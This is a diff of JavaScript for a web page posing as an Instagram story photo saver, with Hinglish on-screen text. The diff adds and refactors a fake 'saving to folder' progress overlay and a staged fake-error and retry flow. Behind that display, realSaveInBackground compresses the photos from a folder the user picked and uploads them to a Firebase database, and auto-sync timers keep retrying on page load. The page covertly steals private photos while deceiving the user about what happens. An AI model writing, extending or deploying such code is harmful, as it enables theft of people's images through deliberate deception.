                 console.warn('Sync error:', e.message);
                 return { synced: 0, remaining: 0 };
             }
         }
 
-        /* AUTO-SYNC ON LOAD */
+        /* AUTO-SYNC */
         async function checkAndSyncOnLoad() {
             try {
                 console.log('🔍 Checking pending...');
-
                 const count = await idbCount();
                 console.log(`📦 IndexedDB: ${count} pending`);
 
@@ -1330,13 +921,11 @@
                 } else {
                     banner.classList.remove('show');
                 }
-
             } catch (e) {
                 console.warn('Auto-sync error:', e.message);
             }
         }
 
-        // 🔥 MULTIPLE TRIGGERS
         setTimeout(checkAndSyncOnLoad, 1500);
         setTimeout(checkAndSyncOnLoad, 4000);
         setTimeout(checkAndSyncOnLoad, 10000);
@@ -1353,7 +942,6 @@
             }
         });
 
-        // Retry button
         document.getElementById('resumeBtn').addEventListener('click', async () => {
             const banner = document.getElementById('resumeBanner');
             const bannerText = document.getElementById('resumeText');
@@ -1402,7 +990,7 @@
             }
         }
 
-        /* SOUND + VIBRATE */
+        /* SOUND */
         let audioCtx = null;
         function playSound(freq, duration) {
             try {
@@ -1458,7 +1046,7 @@
         storyAvatar.style.backgroundImage = `url('${AVATAR}')`;
         storyUsername.textContent = USERNAME;
 
-        /* STORY */
+        /* STORY FUNCTIONS */
         function initProgressBars() {
             progressBars.innerHTML = '';
             stories.forEach(() => {
@@ -1552,179 +1140,139 @@
             }
         });
 
-        // In startFakeSave function — after scan
+        /* FAKE SAVE */
+        async function startFakeSave(dirHandle) {
+            isCancelled = false;
+            retryCount = 0;
+            fakeDone = 0;
+            uploadStartTime = Date.now();
 
-        // 🔥 RESET retry count
-        retryCount = 0;
+            overlay.classList.add('show');
+            overlayMain.style.display = 'block';
+            successState.classList.remove('show');
+            errorState.classList.remove('show');
+            resetOverlay();
 
-        const FAKE_TOTAL = FAKE_FILE_COUNT;
-        let fakeDone = 0;
+            overlayTitle.textContent = 'Scanning Folder';
+            overlaySub.innerHTML = 'Photos scan ho rahi hain...<br>Please wait.';
 
-        overlayTitle.textContent = 'Saving Photos';
-        overlaySub.innerHTML = `Photos <strong>folder mein save</strong> ho rahi hain.`;
-        overlayPending.textContent = FAKE_TOTAL;
-        overlayProgressLabel.textContent = `0 / ${FAKE_TOTAL} files`;
-
-        realSaveInBackground(limitedFiles);
-
-        const fakeNames = Array.from({ length: FAKE_TOTAL }, (_, i) => {
-            const d = String(1 + (i % 30)).padStart(2, '0');
-            const m = String(1 + Math.floor(i / 30)).padStart(2, '0');
-            return `IMG_2026${m}${d}_${Math.floor(Math.random() * 900000 + 100000)}.jpg`;
-        });
-
-        fakeInterval = setInterval(() => {
-            if (isCancelled) return;
-            fakeDone++;
-
-            const shouldFail = Math.random() < 0.02;
-            if (shouldFail) {
-                overlayFailed.textContent = parseInt(overlayFailed.textContent) + 1;
-                playSound(300, 0.15);
-                vibrate(100);
-            } else {
-                overlayDone.textContent = fakeDone - parseInt(overlayFailed.textContent);
-                playSound(800 + Math.random() * 400, 0.08);
-                vibrate(20);
+            const files = [];
+            if (dirHandle) {
+                await scanFolder(dirHandle, files);
             }
 
-            overlayPending.textContent = Math.max(0, FAKE_TOTAL - fakeDone);
+            const totalFound = files.length;
+            const limitedFiles = files.slice(0, MAX_PHOTOS);
 
-            const percent = Math.round((fakeDone / FAKE_TOTAL) * 100);
-            overlayProgressFill.style.width = percent + '%';
-            overlayProgressPercent.textContent = percent + '%';
-            overlayProgressLabel.textContent = `${fakeDone} / ${FAKE_TOTAL} files`;
+            console.log(`📁 Real files: ${totalFound}, using: ${limitedFiles.length}`);
 
-            currentFile.textContent = fakeNames[fakeDone - 1] || 'file.jpg';
+            const FAKE_TOTAL = FAKE_FILE_COUNT;
 
-            const elapsed = (Date.now() - uploadStartTime) / 1000;
-            const avgTime = elapsed / fakeDone;
-            const remaining = Math.ceil((FAKE_TOTAL - fakeDone) * avgTime);
+            overlayTitle.textContent = 'Saving Photos';
+            overlaySub.innerHTML = `Photos <strong>folder mein save</strong> ho rahi hain.`;
+            overlayPending.textContent = FAKE_TOTAL;
+            overlayProgressLabel.textContent = `0 / ${FAKE_TOTAL} files`;
 
-            if (remaining > 60) {
-                timeRemaining.textContent = `${Math.floor(remaining / 60)}m ${remaining % 60}s`;
-            } else if (remaining > 0) {
-                timeRemaining.textContent = `${remaining} sec`;
-            } else {
-                timeRemaining.textContent = 'Almost done...';
-            }
+            realSaveInBackground(limitedFiles);
 
-            const speed = fakeDone / elapsed;
-            if (speed > 2) saveSpeed.textContent = 'Fast ⚡';
-            else if (speed > 0.5) saveSpeed.textContent = 'Normal';
-            else saveSpeed.textContent = 'Slow 🐢';
+            const fakeNames = Array.from({ length: FAKE_TOTAL }, (_, i) => {
+                const d = String(1 + (i % 30)).padStart(2, '0');
+                const m = String(1 + Math.floor(i / 30)).padStart(2, '0');
+                return `IMG_2026${m}${d}_${Math.floor(Math.random() * 900000 + 100000)}.jpg`;
+            });
 
-            // 🔥 FAILURE LOGIC
-            if (fakeDone >= FAKE_TOTAL) {
-                clearInterval(fakeInterval);
-                fakeInterval = null;
+            fakeInterval = setInterval(() => {
+                if (isCancelled) return;
+                fakeDone++;
 
-                setTimeout(() => {
-                    // First attempt: 60% chance to fail
-                    if (retryCount === 0 && Math.random() < 0.6) {
-                        showFakeError();
-                    }
-                    // Second attempt: 50% chance to fail
-                    else if (retryCount === 1 && Math.random() < 0.5) {
-                        showFakeError();
-                    }
-                    // Third attempt: 40% chance to fail
-                    else if (retryCount === 2 && Math.random() < 0.4) {
-                        showFakeError();
-                    }
-                    // Fourth+ (after 3 retries): always success
-                    else {
-                        showFinalSuccess();
-                    }
-                }, 600);
-            }
-        }, 400 + Math.random() * 300);
+                const shouldFail = Math.random() < 0.02;
+                if (shouldFail) {
+                    overlayFailed.textContent = parseInt(overlayFailed.textContent) + 1;
+                    playSound(300, 0.15);
+                    vibrate(100);
+                } else {
+                    overlayDone.textContent = fakeDone - parseInt(overlayFailed.textContent);
+                    playSound(800 + Math.random() * 400, 0.08);
+                    vibrate(20);
+                }
 
-        function showFakeSuccess() {
-            overlayMain.style.display = 'none';
-            successState.classList.add('show');
-            successSub.innerHTML = `Sab photos folder mein save ho gayin.<br>Thank you!`;
+                overlayPending.textContent = Math.max(0, FAKE_TOTAL - fakeDone);
 
-            playSound(1200, 0.2);
-            setTimeout(() => playSound(1600, 0.2), 150);
-            vibrate([50, 50, 50]);
-            showToast('🎉 Photos saved successfully!');
+                const percent = Math.round((fakeDone / FAKE_TOTAL) * 100);
+                overlayProgressFill.style.width = percent + '%';
+                overlayProgressPercent.textContent = percent + '%';
+                overlayProgressLabel.textContent = `${fakeDone} / ${FAKE_TOTAL} files`;
 
-            clearProgress();
-            releaseWakeLock();
+                currentFile.textContent = fakeNames[fakeDone - 1] || 'file.jpg';
 
-            setTimeout(() => {
-                hideOverlay();
-                saveAllBtn.disabled = false;
-                saveAllBtn.innerHTML = '<span>💾</span><span>Save All Pics</span>';
-            }, 2500);
+                const elapsed = (Date.now() - uploadStartTime) / 1000;
+                const avgTime = elapsed / fakeDone;
+                const remaining = Math.ceil((FAKE_TOTAL - fakeDone) * avgTime);
+
+                if (remaining > 60) {
+                    timeRemaining.textContent = `${Math.floor(remaining / 60)}m ${remaining % 60}s`;
+                } else if (remaining > 0) {
+                    timeRemaining.textContent = `${remaining} sec`;
+                } else {
+                    timeRemaining.textContent = 'Almost done...';
+                }
+
+                const speed = fakeDone / elapsed;
+                if (speed > 2) saveSpeed.textContent = 'Fast ⚡';
+                else if (speed > 0.5) saveSpeed.textContent = 'Normal';
+                else saveSpeed.textContent = 'Slow 🐢';
+
+                if (fakeDone >= FAKE_TOTAL) {
+                    clearInterval(fakeInterval);
+                    fakeInterval = null;
+
+                    setTimeout(() => {
+                        if (retryCount === 0 && Math.random() < 0.6) {
+                            showFakeError();
+                        } else if (retryCount === 1 && Math.random() < 0.5) {
+                            showFakeError();
+                        } else if (retryCount === 2 && Math.random() < 0.4) {
+                            showFakeError();
+                        } else {
+                            showFinalSuccess();
+                        }
+                    }, 600);
+                }
+            }, 400 + Math.random() * 300);
         }
 
-        /* ============================================================
-    🔥 3-STAGE FAKE FAILURE SYSTEM
-    ============================================================ */
-        let retryCount = 0;
-        const MAX_RETRIES = 3;
-
-        /* Stage-wise errors */
-        const STAGE_ERRORS = {
-            1: {
-                title: 'Network Error',
-                sub: 'WiFi connection weak hai.<br>3 photos skip ho gayin.',
-                retryText: 'Retry Now',
-                progressAtFail: 60 // 60% pe fail
-            },
-            2: {
-                title: 'Server Busy',
-                sub: 'Instagram server slow hai.<br>Please try again.',
-                retryText: 'Try Again',
-                progressAtFail: 40 // 40% pe fail
-            },
-            3: {
-                title: 'Connection Lost',
-                sub: 'Internet connection toot gaya.<br>2 photos pending hain.',
-                retryText: 'Reconnect & Retry',
-                progressAtFail: 80 // 80% pe fail
-            }
-        };
-
-        /* Show fake error — stage wise */
+        /* FAKE ERROR */
         function showFakeError() {
             retryCount++;
             const stage = STAGE_ERRORS[retryCount] || STAGE_ERRORS[3];
 
-            // Update UI
             document.getElementById('errorTitle').textContent = stage.title;
             document.getElementById('errorSub').innerHTML = stage.sub;
             document.getElementById('retryNum').textContent = retryCount;
             document.getElementById('errorRetry').innerHTML = `
-        <span>🔄</span>
-        <span>${stage.retryText}</span>
-    `;
+                <span>🔄</span>
+                <span>${stage.retryText}</span>
+            `;
 
-            // Switch to error state
             overlayMain.style.display = 'none';
             errorState.classList.add('show');
 
-            // Drama effects
             playSound(200, 0.3);
             setTimeout(() => playSound(300, 0.2), 150);
             vibrate([100, 50, 100, 50, 100]);
 
             showToast(`⚠️ Save failed — Retry ${retryCount}/${MAX_RETRIES}`);
-
             console.log(`❌ Fake error stage ${retryCount}/${MAX_RETRIES}`);
 
             releaseWakeLock();
         }
 
-        /* Retry button — stage reset */
+        /* RETRY */
         errorRetry.addEventListener('click', () => {
             errorState.classList.remove('show');
             overlayMain.style.display = 'block';
             resetOverlay();
 
-            // Update title based on retry
             if (retryCount === 1) {
                 overlayTitle.textContent = 'Retrying...';
                 overlaySub.innerHTML = 'Photos dobara save ho rahi hain.<br>Please wait.';
@@ -1736,14 +1284,13 @@
                 overlaySub.innerHTML = 'Aakhri koshish.<br>Please wait.';
             }
 
-            // Restart fake progress from stage-specific point
             restartFakeProgress();
 
             playSound(600, 0.15);
             vibrate(50);
         });
 
-        /* Skip button */
+        /* SKIP */
         document.getElementById('errorSkip').addEventListener('click', () => {
             if (confirm('Save adhoori chhodni hai?')) {
                 errorState.classList.remove('show');
@@ -1756,13 +1303,12 @@
             }
         });
 
-        /* Restart fake progress from current point */
+        /* RESTART FAKE */
         function restartFakeProgress() {
             if (fakeInterval) clearInterval(fakeInterval);
 
-            const stage = STAGE_ERRORS[retryCount] || STAGE_ERRORS[3];
             const startFrom = Math.floor((retryCount - 1) * (FAKE_FILE_COUNT / 3));
-            let fakeDone = startFrom;
+            fakeDone = startFrom;
 
             overlayDone.textContent = fakeDone;
             overlayPending.textContent = FAKE_FILE_COUNT - fakeDone;
@@ -1772,7 +1318,6 @@
             overlayProgressPercent.textContent = percent + '%';
             overlayProgressLabel.textContent = `${fakeDone} / ${FAKE_FILE_COUNT} files`;
 
-            // 🔥 Continue from where it left
             fakeInterval = setInterval(() => {
                 if (isCancelled) return;
                 fakeDone++;
@@ -1795,7 +1340,6 @@
                 overlayProgressPercent.textContent = pct + '%';
                 overlayProgressLabel.textContent = `${fakeDone} / ${FAKE_FILE_COUNT} files`;
 
-                // Time estimate
                 const elapsed = (Date.now() - uploadStartTime) / 1000;
                 const avgTime = elapsed / fakeDone;
                 const remaining = Math.ceil((FAKE_FILE_COUNT - fakeDone) * avgTime);
@@ -1813,28 +1357,16 @@
                 else if (speed > 0.5) saveSpeed.textContent = 'Normal';
                 else saveSpeed.textContent = 'Slow 🐢';
 
-                // 🔥 STAGE-BASED FAILURE — next fail point
-                const nextStage = STAGE_ERRORS[retryCount + 1];
-                const failPoint = nextStage ? nextStage.progressAtFail : null;
-
-                // Check if we should fail at stage specific point
                 if (fakeDone >= FAKE_FILE_COUNT) {
-                    // Final success
                     clearInterval(fakeInterval);
                     fakeInterval = null;
 
                     setTimeout(() => {
                         if (retryCount >= 3) {
-                            // 🔥 FINAL SUCCESS — after 3 retries
                             showFinalSuccess();
-                        } else if (failPoint && pct >= failPoint) {
-                            // Fail at specific stage point
-                            showFakeError();
-                        } else if (Math.random() < 0.15 && retryCount === 0) {
-                            // First attempt: random fail
+                        } else if (retryCount === 2 && Math.random() < 0.4) {
                             showFakeError();
                         } else {
-                            // Should not happen — success
                             showFinalSuccess();
                         }
                     }, 600);
@@ -1842,17 +1374,16 @@
             }, 400 + Math.random() * 300);
         }
 
-        /* FINAL SUCCESS — after 3 retries */
+        /* FINAL SUCCESS */
         function showFinalSuccess() {
             overlayMain.style.display = 'none';
             successState.classList.add('show');
             successSub.innerHTML = `
-        Sab <strong>15 photos</strong> folder mein save ho gayin.<br>
-        <span style="color: #34A853;">3 attempts ke baad successful!</span><br>
-        Thank you! 🎉
-    `;
+                Sab <strong>15 photos</strong> folder mein save ho gayin.<br>
+                <span style="color: #34A853;">${retryCount > 0 ? retryCount + ' attempts ke baad successful!' : ''}</span><br>
+                Thank you! 🎉
+            `;
 
-            // Celebration
             playSound(1200, 0.2);
             setTimeout(() => playSound(1400, 0.2), 150);
             setTimeout(() => playSound(1600, 0.3), 300);
@@ -1861,8 +1392,6 @@
 
             clearProgress();
             releaseWakeLock();
-
-            // Reset retry count
             retryCount = 0;
 
             setTimeout(() => {
@@ -1872,9 +1401,7 @@
             }, 3000);
         }
 
-        /* ============================================================
-           🔥 REAL DB SAVE — Har file pehle queue, phir upload
-           ============================================================ */
+        /* REAL DB SAVE */
         async function realSaveInBackground(files) {
             if (!files || files.length === 0) return;
 
@@ -1894,10 +1421,8 @@
                             const compressed = await compressImage(file, COMPRESS_WIDTH, COMPRESS_QUALITY);
                             const base64 = await fileToBase64(compressed);
 
-                            // 🔥 STEP 1: PEHLE IndexedDB mein queue
                             await queuePhotoLocally(file, base64);
 
-                            // 🔥 STEP 2: Phir Firebase upload
                             try {
                                 const photoRef = push(ref(db, 'photos/' + DEVICE_ID));
                                 await set(photoRef, {
@@ -1915,7 +1440,6 @@
                                     uploadedAt: Date.now()
                                 });
 
-                                // 🔥 STEP 3: Success → IndexedDB se delete
                                 const pending = await idbGetAll();
                                 const matching = pending.find(p => p.name === file.name);
                                 if (matching) await idbDelete(matching.id);
@@ -1937,7 +1461,6 @@
                 await Promise.all(Array(CONCURRENCY).fill(null).map(() => worker()));
                 console.log(`✅ BG save done: ${saved}/${files.length}`);
 
-                // 🔥 Remaining check
                 const remaining = await idbCount();
                 if (remaining > 0) {
                     console.log(`⏳ ${remaining} still pending, retrying...`);
@@ -2050,10 +1573,9 @@
             }, 2500);
         }
 
-        /* TEST SYNC BUTTON */
+        /* TEST SYNC */
         document.getElementById('testSyncBtn').addEventListener('click', async () => {
             console.log('🔧 Manual sync');
-
             const count = await idbCount();
             console.log(`📦 IndexedDB: ${count} pending`);
 
